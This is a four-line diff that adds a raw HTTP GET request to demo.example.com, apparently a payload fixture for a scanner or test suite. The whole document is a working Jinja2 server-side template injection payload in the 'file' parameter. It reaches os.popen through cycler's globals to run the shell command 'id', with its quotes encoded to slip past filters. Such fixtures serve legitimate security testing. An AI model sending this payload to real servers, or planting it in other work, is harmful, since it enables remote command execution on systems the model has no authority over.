@@ -1,0 +1,4 @@
+GET /a?file={{cycler.__init__.__globals__.os.popen(%26%23x27;id%26%23x27;)}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
